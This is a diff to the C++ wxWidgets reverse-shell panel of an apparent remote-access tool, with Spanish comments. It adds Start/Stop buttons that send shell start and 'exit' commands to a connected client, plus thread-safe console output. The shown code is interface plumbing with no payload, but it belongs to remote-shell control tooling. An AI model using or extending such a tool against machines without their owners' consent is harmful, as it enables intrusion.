@@ -4,28 +4,43 @@
 extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
+wxBEGIN_EVENT_TABLE(panelReverseShell, wxPanel)
+    EVT_BUTTON(wxID_ANY, panelReverseShell::OnButton)
+wxEND_EVENT_TABLE()
+
 //Reverse Shell
 panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck) :
     wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
     
     this->sckCliente = sck;
     
-    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH * 3, FRAME_CLIENT_SIZE_WIDTH * 3), wxTE_MULTILINE | wxTE_RICH);
+    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_RICH);
+    if (this->txtConsole == nullptr) {
+        DEBUG_MSG("No se pudo iniciar el txtConsole");
+    }
     this->txtConsole->SetForegroundColour(*wxWHITE);
     this->txtConsole->SetBackgroundColour(*wxBLACK);
 
-    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
-    sizer->Add(this->txtConsole, 1, wxEXPAND | wxALL, 2);
-    this->SetSizer(sizer);
+    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
+    wxBoxSizer* sizer_controls = new wxBoxSizer(wxHORIZONTAL);
+    
+    sizer_controls->Add(new wxButton(this, EnumReverseShell::BTN_Start, "Iniciar", wxDefaultPosition, wxDefaultSize), 0);
+    sizer_controls->Add(new wxButton(this, EnumReverseShell::BTN_Stop, "Detener", wxDefaultPosition, wxDefaultSize), 0);
+
+    main_sizer->Add(sizer_controls, 0);
+    main_sizer->Add(this->txtConsole, 1, wxEXPAND | wxALL);
+    
+    this->SetSizer(main_sizer);
 
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
-
-    //Enviar comando al cliente para que ejecute la shell
     p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
-
 }
 
 void panelReverseShell::OnHook(wxKeyEvent& event) {
+    if (this->txtConsole == nullptr) {
+        event.Skip();
+        return;
+    }
     //long last_position = this->txtConsole->GetLastPosition();
     unsigned long int current_pos = this->txtConsole->GetInsertionPoint();
     int iCode = event.GetKeyCode();
@@ -85,8 +100,37 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
 }
 
 void panelReverseShell::EscribirSalida(const char*& pBuffer) {
-    if (this->txtConsole) {
-        this->txtConsole->AppendText(wxString(pBuffer));
-        this->p_uliUltimo = this->txtConsole->GetLastPosition();
+    wxString strData(pBuffer);
+    wxTheApp->CallAfter([this, strData]() {
+        if (this->txtConsole) {
+            this->txtConsole->AppendText(strData);
+            this->p_uliUltimo = this->txtConsole->GetLastPosition();
+        }
+        });
+}
+
+void panelReverseShell::OnButton(wxCommandEvent& event) {
+    const int btnID = event.GetId();
+    int iComando = 0;
+    std::string strCommand = "";
+    switch (btnID) {
+        case EnumReverseShell::BTN_Start:
+            iComando = EnumComandos::Reverse_Shell_Start;
+            strCommand = DUMMY_PARAM;
+            break;
+        case EnumReverseShell::BTN_Stop:
+            iComando = EnumComandos::Reverse_Shell_Command;
+            strCommand = "exit\r\n";
+            break;
+        default:
+            iComando = EnumComandos::Reverse_Shell_Command;
+            strCommand = "exit\r\n";
+            break;
     }
+
+    p_Servidor->cChunkSend(this->sckCliente, strCommand.c_str(), strCommand.size(), 0, false, iComando);
+
+    //p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
+
+    //p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
 }
